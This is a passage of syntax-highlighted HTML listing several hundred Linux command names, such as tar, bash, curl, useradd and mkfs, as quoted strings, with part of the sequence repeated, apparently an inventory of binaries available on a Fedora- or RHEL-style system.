class="hljs-string">&quot;utmpdump&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;basename&quot;</span>, <span class="hljs-string">&quot;eject&quot;</span>, <span class="hljs-string">&quot;ranlib&quot;</span>, <span class="hljs-string">&quot;wall&quot;</span>, <span class="hljs-string">&quot;zless&quot;</span>, <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;nsenter&quot;</span>, <span class="hljs-string">&quot;getent&quot;</span>, <span class="hljs-string">&quot;chrt&quot;</span>, <span class="hljs-string">&quot;mount&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;systemctl&quot;</span>, <span class="hljs-string">&quot;vmstat&quot;</span>, <span class="hljs-string">&quot;xmlcatalog&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;lsinitrd&quot;</span>, <span class="hljs-string">&quot;tload&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;setsid&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;colcrt&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;lsipc&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;lsns&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;lastb&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-string">&quot;gpg&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;gpgv&quot;</span>, <span class="hljs-string">&quot;pathchk&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span>, <span class="hljs-string">&quot;lsmem&quot;</span>, <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-string">&quot;as&quot;</span>, <span class="hljs-string">&quot;ipcs&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;iconv&quot;</span>, <span class="hljs-string">&quot;dwp&quot;</span>, <span class="hljs-string">&quot;domainname&quot;</span>, <span class="hljs-string">&quot;xzcat&quot;</span>, <span class="hljs-string">&quot;ldd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;strip&quot;</span>, <span class="hljs-string">&quot;dircolors&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;trust&quot;</span>, <span class="hljs-string">&quot;stty&quot;</span>, <span class="hljs-string">&quot;ul&quot;</span>, <span class="hljs-string">&quot;chacl&quot;</span>, <span class="hljs-string">&quot;loginctl&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;xzmore&quot;</span>, <span class="hljs-string">&quot;zcat&quot;</span>, <span class="hljs-string">&quot;busctl&quot;</span>, <span class="hljs-string">&quot;fincore&quot;</span>, <span class="hljs-string">&quot;fgrep&quot;</span>, <span class="hljs-string">&quot;dmesg&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;lslogins&quot;</span>, <span class="hljs-string">&quot;numfmt&quot;</span>, <span class="hljs-string">&quot;flock&quot;</span>, <span class="hljs-string">&quot;realpath&quot;</span>, <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;lesskey&quot;</span>, <span class="hljs-string">&quot;printenv&quot;</span>, <span class="hljs-string">&quot;du&quot;</span>, <span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;rename&quot;</span>, <span class="hljs-string">&quot;gawk&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;sg&quot;</span>, <span class="hljs-string">&quot;xzegrep&quot;</span>, <span class="hljs-string">&quot;xzdec&quot;</span>, <span class="hljs-string">&quot;split&quot;</span>, <span class="hljs-string">&quot;whereis&quot;</span>, <span class="hljs-string">&quot;strings&quot;</span>, <span class="hljs-string">&quot;setfacl&quot;</span>, <span class="hljs-string">&quot;mkfifo&quot;</span>, <span class="hljs-string">&quot;chage&quot;</span>, <span class="hljs-string">&quot;xzgrep&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;rvi&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;ypdomainname&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>, <span class="hljs-string">&quot;umount&quot;</span>, <span class="hljs-string">&quot;rev&quot;</span>, <span class="hljs-string">&quot;wdctl&quot;</span>, <span class="hljs-string">&quot;uniq&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;stdbuf&quot;</span>, <span class="hljs-string">&quot;chgrp&quot;</span>, <span class="hljs-string">&quot;setarch&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;dirmngr&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;lastlog&quot;</span>, <span class="hljs-string">&quot;gsettings&quot;</span>, <span class="hljs-string">&quot;ex&quot;</span>, <span class="hljs-string">&quot;ipcrm&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;fallocate&quot;</span>, <span class="hljs-string">&quot;colrm&quot;</span>, <span class="hljs-string">&quot;rpm&quot;</span>, <span class="hljs-string">&quot;pwdx&quot;</span>, <span class="hljs-string">&quot;xargs&quot;</span>, <span class="hljs-string">&quot;objdump&quot;</span>, <span class="hljs-string">&quot;ld&quot;</span>, <span class="hljs-string">&quot;chcon&quot;</span>, <span class="hljs-string">&quot;skill&quot;</span>, <span class="hljs-string">&quot;yum&quot;</span>, <span class="hljs-string">&quot;who&quot;</span>, <span class="hljs-string">&quot;gapplication&quot;</span>, <span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;uuidgen&quot;</span>, <span class="hljs-string">&quot;logger&quot;</span>, <span class="hljs-string">&quot;pwscore&quot;</span>, <span class="hljs-string">&quot;xz&quot;</span>, <span class="hljs-string">&quot;mesg&quot;</span>, <span class="hljs-string">&quot;rmdir&quot;</span>, <span class="hljs-string">&quot;zgrep&quot;</span>, <span class="hljs-string">&quot;chmem&quot;</span>, <span class="hljs-string">&quot;newuidmap&quot;</span>, <span class="hljs-string">&quot;evmctl&quot;</span>, <span class="hljs-string">&quot;wc&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;egrep&quot;</span>, <span class="hljs-string">&quot;fold&quot;</span>, <span class="hljs-string">&quot;zfgrep&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;csplit&quot;</span>, <span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;expand&quot;</span>, <span class="hljs-string">&quot;getfacl&quot;</span>, <span class="hljs-string">&quot;newgidmap&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;bootctl&quot;</span>, <span class="hljs-string">&quot;xzless&quot;</span>, <span class="hljs-string">&quot;runcon&quot;</span>, <span class="hljs-string">&quot;dirname&quot;</span>, <span class="hljs-string">&quot;comm&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;ipcalc&quot;</span>, <span class="hljs-string">&quot;unexpand&quot;</span>, <span class="hljs-string">&quot;nohup&quot;</span>, <span class="hljs-string">&quot;zegrep&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;getopt&quot;</span>, <span class="hljs-string">&quot;raw&quot;</span>, <span class="hljs-string">&quot;hexdump&quot;</span>, <span class="hljs-string">&quot;mountpoint&quot;</span>, <span class="hljs-string">&quot;lslocks&quot;</span>, <span class="hljs-string">&quot;coreutils&quot;</span>, <span class="hljs-string">&quot;shred&quot;</span>, <span class="hljs-string">&quot;sotruss&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;pldd&quot;</span>, <span class="hljs-string">&quot;uuidparse&quot;</span>, <span class="hljs-string">&quot;localectl&quot;</span>, <span class="hljs-string">&quot;gtar&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;znew&quot;</span>, <span class="hljs-string">&quot;logname&quot;</span>, <span class="hljs-string">&quot;gzexe&quot;</span>, <span class="hljs-string">&quot;rpmquery&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;cpio&quot;</span>, <span class="hljs-string">&quot;sprof&quot;</span>, <span class="hljs-string">&quot;hostnamectl&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;unxz&quot;</span>, <span class="hljs-string">&quot;zdiff&quot;</span>, <span class="hljs-string">&quot;gdbus&quot;</span>, <span class="hljs-string">&quot;namei&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;kmod&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;zcmp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;mktemp&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;column&quot;</span>, <span class="hljs-string">&quot;scriptreplay&quot;</span>, <span class="hljs-string">&quot;lessecho&quot;</span>, <span class="hljs-string">&quot;look&quot;</span>, <span class="hljs-string">&quot;setterm&quot;</span>, <span class="hljs-string">&quot;gdbmtool&quot;</span>, <span class="hljs-string">&quot;rpmkeys&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;gpasswd&quot;</span>, <span class="hljs-string">&quot;dracut&quot;</span>, <span class="hljs-string">&quot;vdir&quot;</span>, <span class="hljs-string">&quot;mcookie&quot;</span>, <span class="hljs-string">&quot;elfedit&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;objcopy&quot;</span>, <span class="hljs-string">&quot;hostid&quot;</span>, <span class="hljs-string">&quot;shuf&quot;</span>, <span class="hljs-string">&quot;view&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;gpgparsemail&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;tail&quot;</span>, <span class="hljs-string">&quot;zforce&quot;</span>, <span class="hljs-string">&quot;last&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;ionice&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;resolvectl&quot;</span>, <span class="hljs-string">&quot;watchgnupg&quot;</span>, <span class="hljs-string">&quot;unshare&quot;</span>, <span class="hljs-string">&quot;timeout&quot;</span>, <span class="hljs-string">&quot;getconf&quot;</span>, <span class="hljs-string">&quot;findmnt&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;xzfgrep&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;rview&quot;</span>, <span class="hljs-string">&quot;fmt&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;readlink&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;paste&quot;</span>, <span class="hljs-string">&quot;od&quot;</span>, <span class="hljs-string">&quot;setpriv&quot;</span>, <span class="hljs-string">&quot;coredumpctl&quot;</span>, <span class="hljs-string">&quot;dnf&quot;</span>, <span class="hljs-string">&quot;xzdiff&quot;</span>, <span class="hljs-string">&quot;renicerpmverify&quot;</span>, <span class="hljs-string">&quot;pkill&quot;</span>, <span class="hljs-string">&quot;mkinitrd&quot;</span>, <span class="hljs-string">&quot;pmap&quot;</span>, <span class="hljs-string">&quot;snice&quot;</span>, <span class="hljs-string">&quot;gio&quot;</span>, <span class="hljs-string">&quot;gpgconf&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;nproc&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;cksum&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>, <span class="hljs-string">&quot;rpmverify&quot;</span>, <span class="hljs-string">&quot;lsblk&quot;</span>, <span class="hljs-string">&quot;catchsegv&quot;</span>, <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;seq&quot;</span>, <span class="hljs-string">&quot;ln&quot;</span>, <span class="hljs-string">&quot;cut&quot;</span>, <span class="hljs-string">&quot;bashbug&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;gprof&quot;</span>, <span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;npm&quot;</span>, <span class="hljs-string">&quot;corepack&quot;</span>, <span class="hljs-string">&quot;npx&quot;</span>, <span class="hljs-string">&quot;vipw&quot;</span>, <span class="hljs-string">&quot;mkdumprd&quot;</span>, <span class="hljs-string">&quot;ifenslave&quot;</span>, <span class="hljs-string">&quot;fsck&quot;</span>, <span class="hljs-string">&quot;chpasswd&quot;</span>, <span class="hljs-string">&quot;useradd&quot;</span>, <span class="hljs-string">&quot;rtstat&quot;</span>, <span class="hljs-string">&quot;lnstat&quot;</span>, <span class="hljs-string">&quot;hwclock&quot;</span>, <span class="hljs-string">&quot;dhclient&quot;</span>, <span class="hljs-string">&quot;pwunconv&quot;</span>, <span class="hljs-string">&quot;groupmems&quot;</span>, <span class="hljs-string">&quot;mksquashfs&quot;</span>, <span class="hljs-string">&quot;chkconfig&quot;</span>, <span class="hljs-string">&quot;ethtool&quot;</span>, <span class="hljs-string">&quot;packer&quot;</span>, <span class="hljs-string">&quot;mkdict&quot;</span>, <span class="hljs-string">&quot;agetty&quot;</span>, <span class="hljs-string">&quot;applygnupgdefaults&quot;</span>, <span class="hljs-string">&quot;zramctl&quot;</span>, <span class="hljs-string">&quot;swaplabel&quot;</span>, <span class="hljs-string">&quot;blkzone&quot;</span>, <span class="hljs-string">&quot;pwconv&quot;</span>, <span class="hljs-string">&quot;cfdisk&quot;</span>, <span class="hljs-string">&quot;ldattach&quot;</span>, <span class="hljs-string">&quot;reboot&quot;</span>, <span class="hljs-string">&quot;tipc&quot;</span>, <span class="hljs-string">&quot;fstrim&quot;</span>, <span class="hljs-string">&quot;clockdiff&quot;</span>, <span class="hljs-string">&quot;groupadd&quot;</span>, <span class="hljs-string">&quot;dmfilemapd&quot;</span>, <span class="hljs-string">&quot;runuser&quot;</span>, <span class="hljs-string">&quot;modinfo&quot;</span>, <span class="hljs-string">&quot;swapoff&quot;</span>, <span class="hljs-string">&quot;telinit&quot;</span>, <span class="hljs-string">&quot;sfdisk&quot;</span>, <span class="hljs-string">&quot;ctstat&quot;</span>, <span class="hljs-string">&quot;clock&quot;</span>, <span class="hljs-string">&quot;rtpr&quot;</span>, <span class="hljs-string">&quot;fsfreeze&quot;</span>, <span class="hljs-string">&quot;ldconfig&quot;</span>, <span class="hljs-string">&quot;fdformat&quot;</span>, <span class="hljs-string">&quot;getcap&quot;</span>, <span class="hljs-string">&quot;kexec&quot;</span>, <span class="hljs-string">&quot;rdma&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;rtmon&quot;</span>, <span class="hljs-string">&quot;rtacct&quot;</span>, <span class="hljs-string">&quot;fdisk&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;usermod&quot;</span>, <span class="hljs-string">&quot;findfs&quot;</span>, <span class="hljs-string">&quot;halt&quot;</span>, <span class="hljs-string">&quot;resizepart&quot;</span>, <span class="hljs-string">&quot;routef&quot;</span>, <span class="hljs-string">&quot;genl&quot;</span>, <span class="hljs-string">&quot;mkswap&quot;</span>, <span class="hljs-string">&quot;poweroff&quot;</span>, <span class="hljs-string">&quot;rdisc&quot;</span>, <span class="hljs-string">&quot;grpunconv&quot;</span>, <span class="hljs-string">&quot;partx&quot;</span>, <span class="hljs-string">&quot;rtcwake&quot;</span>, <span class="hljs-string">&quot;nologin&quot;</span>, <span class="hljs-string">&quot;rfkill&quot;</span>, <span class="hljs-string">&quot;lspci&quot;</span>, <span class="hljs-string">&quot;vigr&quot;</span>, <span class="hljs-string">&quot;grpconv&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;blkdeactivate&quot;</span>, <span class="hljs-string">&quot;addgnupghome&quot;</span>, <span class="hljs-string">&quot;chroot&quot;</span>, <span class="hljs-string">&quot;shutdown&quot;</span>, <span class="hljs-string">&quot;unsquashfs&quot;</span>, <span class="hljs-string">&quot;readprofile&quot;</span>, <span class="hljs-string">&quot;adduser&quot;</span>, <span class="hljs-string">&quot;groupmod&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-string">&quot;dmstats&quot;</span>, <span class="hljs-string">&quot;ifcfg&quot;</span>, <span class="hljs-string">&quot;modprobe&quot;</span>, <span class="hljs-string">&quot;depmod&quot;</span>, <span class="hljs-string">&quot;iconvconfig&quot;</span>, <span class="hljs-string">&quot;sulogin&quot;</span>, <span class="hljs-string">&quot;rmmod&quot;</span>, <span class="hljs-string">&quot;grpck&quot;</span>, <span class="hljs-string">&quot;nstat&quot;</span>, <span class="hljs-string">&quot;ifstat&quot;</span>, <span class="hljs-string">&quot;sysctl&quot;</span>, <span class="hljs-string">&quot;insmod&quot;</span>, <span class="hljs-string">&quot;routel&quot;</span>, <span class="hljs-string">&quot;zdump&quot;</span>, <span class="hljs-string">&quot;blkdiscard&quot;</span>, <span class="hljs-string">&quot;getpcaps&quot;</span>, <span class="hljs-string">&quot;losetup&quot;</span>, <span class="hljs-string">&quot;setpci&quot;</span>, <span class="hljs-string">&quot;dmsetup&quot;</span>, <span class="hljs-string">&quot;wipefs&quot;</span>, <span class="hljs-string">&quot;addpart&quot;</span>, <span class="hljs-string">&quot;zic&quot;</span>, <span class="hljs-string">&quot;userdel&quot;</span>, <span class="hljs-string">&quot;makedumpfile&quot;</span>, <span class="hljs-string">&quot;blkid&quot;</span>, <span class="hljs-string">&quot;groupdel&quot;</span>, <span class="hljs-string">&quot;setcap&quot;</span>, <span class="hljs-string">&quot;chgpasswd&quot;</span>, <span class="hljs-string">&quot;resolvconf&quot;</span>, <span class="hljs-string">&quot;newusers&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;arping&quot;</span>, <span class="hljs-string">&quot;pwck&quot;</span>, <span class="hljs-string">&quot;devlink&quot;</span>, <span class="hljs-string">&quot;lsmod&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;mkfs&quot;</span>, <span class="hljs-string">&quot;faillock&quot;</span>, <span class="hljs-string">&quot;runlevel&quot;</span>, <span class="hljs-string">&quot;blockdev&quot;</span>, <span class="hljs-string">&quot;swapon&quot;</span>, <span class="hljs-string">&quot;alternatives&quot;</span>, <span class="hljs-string">&quot;arpd&quot;</span>, <span class="hljs-string">&quot;delpart&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;chcpu&quot;</span>, <span class="hljs-string">&quot;capsh&quot;</span>, <span class="hljs-string">&quot;ctrlaltdel&quot;</span>, <span class="hljs-string">&quot;bridge&quot;</span>, <span class="hljs-string">&quot;less&quot;</span>, <span class="hljs-string">&quot;gpgsplit&quot;</span>, <span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;localedef&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;gencat&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;ptx&quot;</span>, <span class="hljs-string">&quot;nm&quot;</span>, <span class="hljs-string">&quot;pwmake&quot;</span>, <span class="hljs-string">&quot;zmore&quot;</span>, <span class="hljs-string">&quot;tzselect&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;dnsdomainname&quot;</span>, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;more&quot;</span>, <span class="hljs-string">&quot;journalctl&quot;</span>, <span class="hljs-string">&quot;gunzip&quot;</span>, <span class="hljs-string">&quot;makedb&quot;</span>, <span class="hljs-string">&quot;tac&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;sync&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;locale&quot;</span>, <span class="hljs-string">&quot;prlimit&quot;</span>, <span class="hljs-string">&quot;nisdomainname&quot;</span>, <span class="hljs-string">&quot;timedatectl&quot;</span>, <span class="hljs-string">&quot;ipcmk&quot;</span>, <span class="hljs-string">&quot;isosize&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;taskset&quot;</span>, <span class="hljs-string">&quot;factor&quot;</span>, <span class="hljs-string">&quot;pinky&quot;</span>, <span class="hljs-string">&quot;arch&quot;</span>, <span class="hljs-string">&quot;lscpu&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <span class="hljs-string">&quot;tty&quot;</span>, <span class="hljs-string">&quot;xmllint&quot;</span>, <span class="hljs-string">&quot;xzcmp&quot;</span>, <span class="hljs-string">&quot;readelf&quot;</span>, <span class="hljs-string">&quot;kdumpctl&quot;</span>, <span class="hljs-string">&quot;tsort&quot;</span>, <span class="hljs-string">&quot;nice&quot;</span>, <span class="hljs-string">&quot;cal&quot;</span>, <span class="hljs-string">&quot;rpmdb&quot;</span>, <span class="hljs-string">&quot;newgrp&quot;</span>, <span class="hljs-string">&quot;xmlwf&quot;</span>, <span class="hljs-string">&quot;slabtop&quot;</span>, <span class="hljs-string">&quot;utmpdump&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;basename&quot;</span>, <span class="hljs-string">&quot;eject&quot;</span>, <span class="hljs-string">&quot;ranlib&quot;</span>, <span class="hljs-string">&quot;wall&quot;</span>, <span class="hljs-string">&quot;zless&quot;</span>, <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;nsenter&quot;</span>, <span class="hljs-string">&quot;getent&quot;</span>, <span class="hljs-string">&quot;chrt&quot;</span>, <span class="hljs-string">&quot;mount&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;systemctl&quot;</span>, <span class="hljs-string">&quot;vmstat&quot;</span>, <span class="hljs-string">&quot;xmlcatalog&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;lsinitrd&quot;</span>, <span class="hljs-string">&quot;tload&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;setsid&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;colcrt&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;lsipc&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;lsns&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;lastb&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-string">&quot;gpg&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;gpgv&quot;</span>, <span class="hljs-string">&quot;pathchk&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span>, <span class="hljs-string">&quot;lsmem&quot;</span>, <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-string">&quot;as&quot;</span>, <span class="hljs-string">&quot;ipcs&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;iconv&quot;</span>, <span class="hljs-string">&quot;dwp&quot;</span>, <span class="hljs-string">&quot;domainname&quot;</span>, <span class="hljs-string">&quot;xzcat&quot;</span>, <span class="hljs-string">&quot;ldd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;strip&quot;</span>, <span class="hljs-string">&quot;dircolors&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;trust&quot;</span>, <span class="hljs-string">&quot;stty&quot;</span>, <span class="hljs-string">&quot;ul&quot;</span>, <span class="hljs-string">&quot;chacl&quot;</span>, <span class="hljs-string">&quot;loginctl&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;xzmore&quot;</span>, <span class="hljs-string">&quot;zcat&quot;</span>, <span class="hljs-string">&quot;busctl&quot;</span>, <span class="hljs-string">&quot;fincore&quot;</span>, <span class="hljs-string">&quot;fgrep&quot;</span>, <span class="hljs-string">&quot;dmesg&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;lslogins&quot;</span>, <span class="hljs-string">&quot;numfmt&quot;</span>, <span class="hljs-string">&quot;flock&quot;</span>, <span class="hljs-string">&quot;realpath&quot;</span>, <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;lesskey&quot;</span>, <span class="hljs-string">&quot;printenv&quot;</span>, <span class="hljs-string">&quot;du&quot;</span>, <span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;rename&quot;</span>, <span class="hljs-string">&quot;gawk&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;sg&quot;</span>, <span class="hljs-string">&quot;xzegrep&quot;</span>, <span class="hljs-string">&quot;xzdec&quot;</span>, <span class="hljs-string">&quot;split&quot;</span>, <span class="hljs-string">&quot;whereis&quot;</span>, <span class="hljs-string">&quot;strings&quot;</span>, <span class="hljs-string">&quot;setfacl&quot;</span>, <span class="hljs-string">&quot;mkfifo&quot;</span>, <span class="hljs-string">&quot;chage&quot;</span>, <span class="hljs-string">&quot;xzgrep&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;rvi&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;ypdomainname&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>, <span class="hljs-string">&quot;umount&quot;</span>, <span class="hljs-string">&quot;rev&quot;</span>, <span class="hljs-string">&quot;wdctl&quot;</span>, <span class="hljs-string">&quot;uniq&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;stdbuf&quot;</span>, <span class="hljs-string">&quot;chgrp&quot;</span>, <span class="hljs-string">&quot;setarch&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;dirmngr&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;lastlog&quot;</span>, <span class="hljs-string">&quot;gsettings&quot;</span>, <span class="hljs-string">&quot;ex&quot;</span>, <span class="hljs-string">&quot;ipcrm&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;fallocate&quot;</span>, <span class="hljs-string">&quot;colrm&quot;</span>, <span class="hljs-string">&quot;rpm&quot;</span>, <span class="hljs-string">&quot;pwdx&quot;</span>, <span class="hljs-string">&quot;xargs&quot;</span>, <span class="hljs-string">&quot;objdump&quot;</span>, <span class="hljs-string">&quot;ld&quot;</span>, <span class="hljs-string">&quot;chcon&quot;</span>, <span class="hljs-string">&quot;skill&quot;</span>, <span class="hljs-string">&quot;yum&quot;</span>, <span class="hljs-string">&quot;who&quot;</span>, <span class="hljs-string">&quot;gapplication&quot;</span>, <span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;uuidgen&quot;</span>, <span class="hljs-string">&quot;logger&quot;</span>, <span class="hljs-string">&quot;pwscore&quot;</span>, <span class="hljs-string">&quot;xz&quot;</span>, <span class="hljs-string">&quot;mesg&quot;</span>, <span class="hljs-string">&quot;rmdir&quot;</span>, <span class="hljs-string">&quot;zgrep&quot;</span>, <span class="hljs-string">&quot;chmem&quot;</span>, <span class="hljs-string">&quot;newuidmap&quot;</span>, <span class="hljs-string">&quot;evmctl&quot;</span>, <span class="hljs-string">&quot;wc&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;egrep&quot;</span>, <span class="hljs-string">&quot;fold&quot;</span>, <span class="hljs-string">&quot;zfgrep&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span 